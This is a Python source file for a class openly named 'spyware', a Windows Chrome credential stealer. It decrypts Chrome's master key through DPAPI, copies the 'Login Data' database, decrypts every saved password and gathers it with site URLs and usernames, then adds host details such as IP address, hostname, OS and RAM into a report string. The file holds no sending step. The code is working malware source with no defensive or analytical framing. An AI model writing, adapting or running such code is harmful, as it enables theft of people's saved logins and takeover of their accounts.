import os
import json
import base64
import shutil
import psutil
import socket
import sqlite3
import platform
import win32crypt
from Cryptodome.Cipher import AES

class spyware:
    temp = ""
    def __init__(self):
        self.temp = ""

    def fetch_encryption_key(self):
        local_computer_directory_path = os.path.join(
        os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", 
        "User Data", "Local State")
        
        with open(local_computer_directory_path, "r", encoding="utf-8") as f:
            local_state_data = f.read()
            local_state_data = json.loads(local_state_data)
    
        encryption_key = base64.b64decode(
        local_state_data["os_crypt"]["encrypted_key"])
        encryption_key = encryption_key[5:]
        
        return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]
   
    def decrypt_passwords(self, password, encryption_key):
        try:
            iv = password[3:15]
            password = password[15:]
                        
            cipher = AES.new(encryption_key, AES.MODE_GCM, iv)            
            return cipher.decrypt(password)[:-16].decode()
        except:    
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return "No Passwords"

    def get_passwords(self):
        final_ans = "Chrome Passwords:\n\n"
        key = self.fetch_encryption_key()
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
        
        filename = "ChromePasswords.db"
        shutil.copyfile(db_path, filename)        
        db = sqlite3.connect(filename)
        cursor = db.cursor()
                
        cursor.execute(
            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
            "order by date_last_used")
        

        for row in cursor.fetchall():
            main_url = row[0]
            login_url = row[1]
            username = row[2]
            password = self.decrypt_passwords(row[3], key)
            
            if username or password:                                    
                final_ans += f"Main URL: {main_url}\n"
                final_ans += f"Login URL: {login_url}\n"
                final_ans += f"Username: {username}\n"
                final_ans += f"Password: {password}\n\n"         
            else:
                continue

            final_ans += "=" * 80 + "\n\n"

        cursor.close()
        db.close()
        
        try:            
            os.remove(filename)
        except:
            pass

        return final_ans

    def get_system_info(self):
        final_str = "System Information:\n\n"
        
        data_dictionary = {"IP-Address" : "", "Hostname" : "", "Platform:" : "", "Release-Data" : "", "Version" : "", "Processor" : "", "Architecture" : "", "Ram" : ""}
        data_dictionary["Platform:"] = platform.system()
        data_dictionary["Release-Data"] = platform.release()
        data_dictionary["Version"] = platform.version()
        data_dictionary["Architecture"] = platform.machine()
        data_dictionary["Hostname"] = socket.gethostname()
        data_dictionary["IP-Address"] = socket.gethostbyname(socket.gethostname())
        data_dictionary["Processor"] = platform.processor()
        data_dictionary["Ram"] = str(round(psutil.virtual_memory().total / (1024.0 **3))) +" GB"
        
        for key, value in data_dictionary.items():
            final_str += "{}: {}\n".format(key, value)            

        return final_str

    def report(self):
        system_info = ""
        try:
            system_info += self.get_passwords()
            system_info += self.get_system_info()
            return system_info
        except Exception:
            pass